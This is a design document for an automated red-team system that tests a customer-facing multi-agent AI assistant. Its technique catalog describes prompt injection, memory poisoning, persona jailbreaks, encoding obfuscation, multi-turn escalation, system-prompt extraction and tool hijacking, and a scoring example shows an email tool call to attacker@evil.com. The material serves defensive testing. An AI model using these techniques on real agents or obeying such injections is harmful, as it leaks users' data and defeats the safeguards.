# AI Red Team System — Design Document
**Target Application:** Customer-Facing Agentic AI Assistant  
**Version:** 1.0 | **Date:** April 14, 2026  
**Classification:** Internal

---

## 1. Executive Summary

This document specifies the design of an **AI Red Team System (ARTS)** — an automated security testing platform that generates, executes, and reports on adversarial attacks against a customer-facing agentic AI application. The target system is an orchestrated multi-agent architecture comprising a primary orchestrator agent, sub-agents, tool integrations, MCP (Model Context Protocol) servers, and persistent data stores.

ARTS uses a **hybrid generation model**: a curated attack template library is enriched and customized at runtime by an LLM-based test-generation agent, producing tailored attack scenarios tuned to the specific surface area of the target application. Outputs include runnable test scripts, human-readable test plans, and scored risk reports.

---

## 2. Target Application Attack Surface

The target agentic AI application exposes the following attack surfaces that ARTS must cover:

| Surface | Description | Example Components |
|---|---|---|
| **Primary Orchestrator** | The top-level LLM agent that receives user input and routes to sub-agents | GPT-4o / Claude orchestrator layer |
| **Sub-Agents** | Specialized agents invoked by the orchestrator for discrete tasks | Research agent, code agent, summarization agent |
| **Tools** | External functions callable by agents (API calls, code execution, file I/O) | Web search, calculator, email sender, browser |
| **MCP Servers** | Model Context Protocol servers providing structured context, memory, and capabilities | File system MCP, database MCP, calendar MCP |
| **Data Stores** | Persistent memory, vector databases, RAG knowledge bases, session state | Pinecone / Weaviate, Redis session store, SQL DB |
| **User Interface** | The customer-facing interface where external users inject prompts | Chat UI, API endpoint, voice interface |
| **System Prompt / Config** | Static instructions and persona definitions loaded at agent initialization | System prompt, role config, tool whitelists |

---

## 3. System Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    AI Red Team System (ARTS)                    │
│                                                                 │
│  ┌──────────────────┐    ┌───────────────────────────────────┐  │
│  │  App Profiler    │───▶│   Test Generation Engine          │  │
│  │                  │    │                                   │  │
│  │ • Surface mapper │    │  ┌─────────────┐ ┌─────────────┐ │  │
│  │ • Schema parser  │    │  │ Template    │ │ AI Enricher │ │  │
│  │ • Tool inventory │    │  │ Library     │ │ (LLM Agent) │ │  │
│  │ • MCP discovery  │    │  └──────┬──────┘ └──────┬──────┘ │  │
│  └──────────────────┘    │         └────────┬───────┘        │  │
│                          │                  ▼                 │  │
│                          │        ┌─────────────────┐        │  │
│                          │        │  Test Case Pool │        │  │
│                          │        └────────┬────────┘        │  │
│                          └─────────────────┼─────────────────┘  │
│                                            │                    │
│  ┌─────────────────────────────────────────▼─────────────────┐  │
│  │                   Execution Engine                        │  │
│  │                                                           │  │
│  │  ┌──────────────┐  ┌──────────────┐  ┌────────────────┐  │  │
│  │  │ Single-turn  │  │  Multi-turn  │  │  Agentic Chain │  │  │
│  │  │  Runner      │  │  Runner      │  │  Runner        │  │  │
│  │  └──────────────┘  └──────────────┘  └────────────────┘  │  │
│  └────────────────────────────┬──────────────────────────────┘  │
│                               │                                 │
│  ┌────────────────────────────▼──────────────────────────────┐  │
│  │                  Evaluation & Scoring Layer               │  │
│  │                                                           │  │
│  │  • LLM-as-Judge  • Rule-based Classifier  • ASR Tracker  │  │
│  └────────────────────────────┬──────────────────────────────┘  │
│                               │                                 │
│  ┌────────────────────────────▼──────────────────────────────┐  │
│  │                  Output Generator                         │  │
│  │                                                           │  │
│  │  • Automated Test Scripts (.py / .yaml)                   │  │
│  │  • Human-readable Test Plans (.md)                        │  │
│  │  • Risk Report with CVSS-style scoring (.pdf / .md)       │  │
│  └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 4. Core Components

### 4.1 App Profiler

The App Profiler performs **pre-test reconnaissance** on the target agentic application before any attacks are generated. It produces a structured **Application Profile** that drives test customization.

**Inputs:**
- API schema / OpenAPI spec of the target system
- System prompt (if accessible)
- Tool manifest (names, descriptions, parameter schemas)
- MCP server registry
- Data store schema (vector DB collection names, SQL schema, etc.)

**Outputs (Application Profile):**
```json
{
  "agent_topology": ["orchestrator", "research_agent", "code_agent"],
  "tools": ["web_search", "send_email", "execute_code", "read_file"],
  "mcp_servers": ["filesystem", "calendar", "database"],
  "data_stores": ["rag_kb", "session_redis", "user_profile_db"],
  "user_input_channels": ["chat_api", "voice"],
  "trust_boundaries": {
    "user_to_orchestrator": "low_trust",
    "orchestrator_to_subagent": "high_trust",
    "agent_to_mcp": "high_trust"
  }
}
```

**Key Activities:**
- Parse tool schemas to identify dangerous tools (email send, code exec, file write, HTTP calls)
- Identify trust boundary transitions (user → agent, agent → tool, agent → MCP)
- Flag high-risk data stores (PII, credentials, financial records)
- Detect agentic chaining patterns that could be exploited

---

### 4.2 Test Generation Engine

The Test Generation Engine operates in **hybrid mode**: a curated Template Library provides the base attack catalog, and an **AI Enricher agent** customizes each template to the specific application profile.

#### 4.2.1 Template Library

The library contains parameterized attack templates organized by technique. Each template specifies:

| Field | Description |
|---|---|
| `technique_id` | Unique identifier (e.g., `RT-001`) |
| `technique_name` | Human-readable name |
| `attack_surface` | Which surface this targets (orchestrator / sub-agent / tool / MCP / data store) |
| `attack_type` | single-turn / multi-turn / agentic-chain |
| `template_prompt` | Prompt skeleton with `{{placeholders}}` |
| `success_criteria` | What constitutes a successful attack |
| `severity` | Critical / High / Medium / Low |

#### 4.2.2 AI Enricher Agent

The AI Enricher is an LLM agent (isolated from the target system) that receives the Application Profile + a base template and outputs 3–10 customized, realistic attack variants. It is prompted to:

- Replace `{{tool_name}}` with actual tools from the profile (e.g., `send_email`)
- Tailor persona / roleplay attacks to match the application's domain (e.g., "Act as a customer support supervisor...")
- Generate multi-turn escalation scripts that reference real conversation context
- Adapt encoding obfuscation to formats the target application is known to handle (e.g., JSON, markdown, code blocks)
- Create chained attack scenarios that flow across trust boundaries (user → orchestrator → sub-agent → data store)

---

### 4.3 Attack Technique Catalog (Mapped to Agentic Surfaces)

The following techniques from the current red-teaming research landscape are implemented in ARTS, mapped to the relevant attack surfaces of the target agentic application:

| ID | Technique | Target Surface | Attack Mode | Severity | Description |
|---|---|---|---|---|---|
| RT-001 | **Direct Prompt Injection** | Orchestrator, Sub-Agents | Single-turn | Critical | User injects override instructions directly in chat input to hijack agent behavior, extract system prompt, or redirect agent actions |
| RT-002 | **Indirect Prompt Injection** | MCP Servers, Tools, RAG | Single-turn / Agentic | Critical | Malicious instructions hidden in external content retrieved by the agent (web pages, documents, database records, calendar events) that the agent executes as commands |
| RT-003 | **RAG / Memory Poisoning (AgentPoison)** | Data Stores, RAG KB | Pre-attack setup + Agentic | Critical | Attacker poisons vector knowledge base or long-term agent memory with backdoor entries that trigger malicious behavior when retrieved |
| RT-004 | **Roleplay / Persona Jailbreak** | Orchestrator | Single-turn | High | Exploits roleplay framing ("pretend you are an uncensored AI", fictional character impersonation) to bypass safety guardrails |
| RT-005 | **Logic Trap Attack** | Orchestrator, Sub-Agents | Single-turn | High | Embeds harmful requests inside conditional logic, moral dilemmas, or hypothetical structures that trick the agent into justifying or completing the harmful output |
| RT-006 | **Encoding Obfuscation** | Orchestrator, Input Filters | Single-turn | High | Represents harmful requests in Base64, ROT13, leetspeak, Unicode lookalikes, or zero-width characters to evade keyword-based safety classifiers |
| RT-007 | **Crescendo (Gradual Escalation)** | Orchestrator | Multi-turn | High | Opens with benign topic; across multiple turns gradually steers conversation toward harmful or policy-violating outputs through incremental escalation |
| RT-008 | **GOAT (Generative Offensive Agent Tester)** | Orchestrator, Sub-Agents | Multi-turn | High | Automated multi-turn jailbreaking that chains multiple adversarial techniques across a conversation, adapting strategy based on each model response |
| RT-009 | **M2S (Multi-turn to Single-turn Collapse)** | Orchestrator, Input Filters | Single-turn | High | Consolidates a multi-turn attack scenario into a single prompt using enumerated or code-like structures; bypasses both native guardrails and external I/O filters |
| RT-010 | **Tool Hijacking via Injection** | Tools (Email, Code Exec, File I/O) | Agentic Chain | Critical | Prompt injection that causes the agent to invoke a dangerous tool (e.g., send email, execute code, delete file) with attacker-controlled parameters |
| RT-011 | **MCP Server Impersonation** | MCP Servers | Agentic Chain | Critical | Attacker-controlled MCP server responds with malicious context or instructions that the agent trusts and acts upon, exploiting the high-trust agent→MCP boundary |
| RT-012 | **Sub-Agent Trust Escalation** | Sub-Agents | Agentic Chain | High | Attacker manipulates the orchestrator to pass malicious instructions to a sub-agent that has elevated privileges or access to sensitive tools |
| RT-013 | **Cross-Agent Exfiltration** | Sub-Agents, Data Stores | Agentic Chain | High | Attack that causes one agent to retrieve sensitive data from a data store and pass it to another agent or external channel controlled by the attacker |
| RT-014 | **System Prompt Extraction** | Orchestrator | Single-turn / Multi-turn | High | Attempts to reveal the confidential system prompt through direct request, indirect reflection, token-by-token reconstruction, or completion baiting |
| RT-015 | **Full Kill Chain Chaining** | All Surfaces | Agentic Chain | Critical | Sequences multiple attack steps end-to-end: injection → trust escalation → tool hijack → data exfiltration, mirroring real-world attacker kill chains |
| RT-016 | **TAP (Tree of Attacks with Pruning)** | Orchestrator | Single-turn | High | Uses an AI attacker that explores a tree of prompt variations, pruning ineffective branches and converging on the highest-ASR jailbreak variant |
| RT-017 | **PAIR (Iterative Refinement)** | Orchestrator | Single-turn | Medium | An AI attacker iteratively rewrites prompts based on judge feedback until a successful jailbreak is found; effective black-box technique |
| RT-018 | **Multimodal Injection** | Orchestrator, Tools | Single-turn | High | Hides adversarial instructions in uploaded images, audio transcripts, or documents processed by the multimodal agent, exploiting data/instruction confusion |
| RT-019 | **Session State Manipulation** | Data Stores (Session) | Multi-turn / Agentic | High | Attacker manipulates session state stored in Redis or equivalent to carry over injected context across conversation turns or user sessions |

---

### 4.4 Execution Engine

The Execution Engine runs generated test cases against the target application via its API. It supports three runner modes:

#### Single-Turn Runner
- Sends one adversarial prompt, records the full response
- Suitable for: RT-001, RT-004, RT-005, RT-006, RT-009, RT-014, RT-016, RT-017, RT-018

#### Multi-Turn Runner
- Maintains conversation state; executes a scripted sequence of turns
- Configurable think-time between turns to avoid rate limiting
- Suitable for: RT-007, RT-008, RT-009, RT-013, RT-019

#### Agentic Chain Runner
- Orchestrates a full attack scenario that spans multiple agent hops, tool calls, and MCP interactions
- Intercepts and logs intermediate tool invocations and sub-agent calls (requires target app to expose trace/debug hooks, or uses proxy interception)
- Suitable for: RT-002, RT-003, RT-010, RT-011, RT-012, RT-013, RT-015

**Configuration:**
```yaml
execution:
  target_base_url: "https://app.example.com/api/v1/chat"
  auth_token_env: "REDTEAM_API_KEY"
  rate_limit_rps: 2
  timeout_seconds: 30
  retry_on_error: 3
  trace_mode: true          # capture intermediate tool calls if supported
  proxy_intercept: false    # set true to use mitmproxy for tool call capture
```

---

### 4.5 Evaluation & Scoring Layer

Each test execution is evaluated by a combination of:

**LLM-as-Judge:**
- A separate, isolated judge LLM scores the target response for: policy violation, harmful content, successful data leak, or unintended tool invocation
- Uses structured scoring rubric (0–1 per category)
- Configured with a strict system prompt to avoid judge manipulation

**Rule-Based Classifier:**
- Regex and keyword patterns that flag known unsafe outputs (e.g., PII patterns, known harmful content markers, exfiltrated secret formats)
- Checks for unexpected tool call presence in response traces

**Attack Success Rate (ASR) Tracker:**
- Tracks success/failure per technique, per surface, per run
- Aggregates over all test variants to produce per-technique ASR %
- Compares against baseline thresholds to flag regressions

**Scoring Schema:**
```json
{
  "test_id": "RT-010-variant-3",
  "technique": "Tool Hijacking via Injection",
  "target_surface": "email_tool",
  "result": "success",
  "severity": "Critical",
  "evidence": {
    "injected_prompt": "...",
    "agent_response": "...",
    "tool_calls_observed": ["send_email(to='attacker@evil.com', body='...')"]
  },
  "judge_score": 0.95,
  "rule_flags": ["unexpected_email_send"],
  "asr_contribution": true
}
```

---

### 4.6 Output Generator

ARTS produces three output artifact types per red team run:

#### A. Automated Test Scripts
- Format: Python (pytest) + YAML config files
- Each test case is a standalone function that calls the target API and asserts the expected safe behavior
- Designed to plug into CI/CD pipelines for regression testing after model updates or config changes

```python
# Example generated test
def test_rt010_tool_hijacking_email_variant3():
    """RT-010: Tool Hijacking — send_email via indirect injection"""
    payload = load_variant("RT-010", variant=3)
    response = target_client.chat(payload.prompt)
    assert "send_email" not in response.tool_calls, \
        f"FAIL: agent invoked send_email unexpectedly. Evidence: {response}"
```

#### B. Human-Readable Test Plans
- Format: Markdown (`.md`)
- Per technique section with: objective, prerequisites, step-by-step attack walkthrough, expected vs. observed behavior, pass/fail criteria
- Suitable for manual red teamers to execute without code

#### C. Risk Report
- Format: Markdown (with optional PDF export)
- Executive summary with overall risk posture (color-coded)
- Per-technique findings table with severity, ASR%, evidence excerpts, and remediation guidance
- Trend comparison if prior runs exist (regression/improvement)
- Prioritized remediation backlog

---

## 5. Test Generation Workflow (End-to-End)

```
Step 1: Profile
  Run App Profiler against target application API and config
  → Produces: Application Profile JSON

Step 2: Select
  ARTS loads Template Library and filters relevant techniques
  based on which surfaces/tools/MCP servers are present
  → Produces: Applicable technique list (subset of RT-001..RT-019)

Step 3: Enrich
  AI Enricher agent takes each applicable template + Application Profile
  and generates N customized variants per technique
  → Produces: Test Case Pool (typically 50–200 test cases)

Step 4: Execute
  Execution Engine runs all test cases against target app
  using appropriate runner (single-turn / multi-turn / agentic chain)
  → Produces: Raw result logs with evidence

Step 5: Evaluate
  LLM Judge + Rule Classifier scores each result
  ASR Tracker aggregates metrics
  → Produces: Scored result dataset

Step 6: Output
  Output Generator produces:
  (a) Automated test scripts for CI/CD
  (b) Human-readable test plan
  (c) Risk report with remediation guidance
```

---

## 6. Trust & Isolation Requirements

Because ARTS itself uses an LLM agent (the AI Enricher) and connects to the target application, the following isolation controls are mandatory:

| Control | Requirement |
|---|---|
| **Enricher isolation** | The AI Enricher LLM must have no network access to the target application; it only receives the Application Profile JSON as input |
| **Test execution isolation** | Execution Engine runs in a sandboxed environment with no access to production data stores; uses a dedicated test tenant / environment |
| **Judge isolation** | The LLM-as-Judge must be a different model/provider than the target LLM to prevent self-evaluation bias |
| **Credential separation** | Red team API keys scoped to test environments only; no production write permissions |
| **Logging** | All attack payloads and responses logged with immutable audit trail; access restricted to security team |
| **Rate limiting** | Execution Engine rate-limited to avoid DoS on target application |

---

## 7. Extensibility

ARTS is designed to be extended over time:

- **New techniques:** Add a new template YAML to the Template Library; the AI Enricher handles customization automatically
- **New surfaces:** Add surface descriptors to the Application Profile schema; update runner to support new interaction patterns
- **New judge criteria:** Add rule patterns or update the judge rubric without changing core architecture
- **Scheduled runs:** ARTS exposes a CLI and API so runs can be scheduled pre-release, post-model-update, or on a regular cadence
- **Plugin hooks:** Pre/post execution hooks allow integration with ticketing systems (Jira, Linear) for automatic finding creation

---

## 8. Key Risks & Mitigations

| Risk | Mitigation |
|---|---|
| AI Enricher generates ineffective or nonsensical variants | Human review gate on generated test cases before execution in production red team runs |
| Judge LLM is itself jailbroken during evaluation | Judge runs with a minimal, hardened system prompt; outputs validated against schema |
| Real user data exposed during red team run | Execution always against test/staging environment with synthetic data |
| Attack scripts accidentally run in production | CI/CD gate requires explicit `--env=redteam` flag; production API keys excluded from ARTS config |
| Novel attacks not in template library | Quarterly review cycle to incorporate new research; AI Enricher can be prompted to propose new technique categories |

---

## 9. Phased Implementation Roadmap

| Phase | Scope | Timeline |
|---|---|---|
| **Phase 1 — Foundation** | App Profiler + Template Library (RT-001 to RT-007) + Single-turn Runner + Basic Report | Weeks 1–4 |
| **Phase 2 — Multi-turn & Agentic** | Multi-turn Runner + Agentic Chain Runner (RT-008 to RT-015) + LLM Judge | Weeks 5–8 |
| **Phase 3 — AI Enricher** | AI Enricher integration + variant generation + full Test Case Pool | Weeks 9–11 |
| **Phase 4 — CI/CD Integration** | Test script output + pipeline hooks + regression tracking | Weeks 12–14 |
| **Phase 5 — Advanced Techniques** | RT-016 (TAP), RT-017 (PAIR), RT-018 (Multimodal), RT-019 (Session) + trend reporting | Weeks 15–18 |

---

## 10. Glossary

| Term | Definition |
|---|---|
| ASR | Attack Success Rate — percentage of attack variants that successfully bypass the target's defenses |
| MCP | Model Context Protocol — a standard protocol for providing structured context and tools to LLM agents |
| RAG | Retrieval-Augmented Generation — architecture where the agent retrieves relevant documents from a knowledge base before responding |
| Trust Boundary | A boundary between two components with different levels of trust (e.g., external user → orchestrator, orchestrator → internal tool) |
| Agentic Chain | A sequence of agent actions that spans multiple hops: model inference → tool call → sub-agent invocation → data store access |
| Kill Chain | End-to-end attack sequence from initial access to final objective, composed of multiple individual techniques |

---

*End of Document*
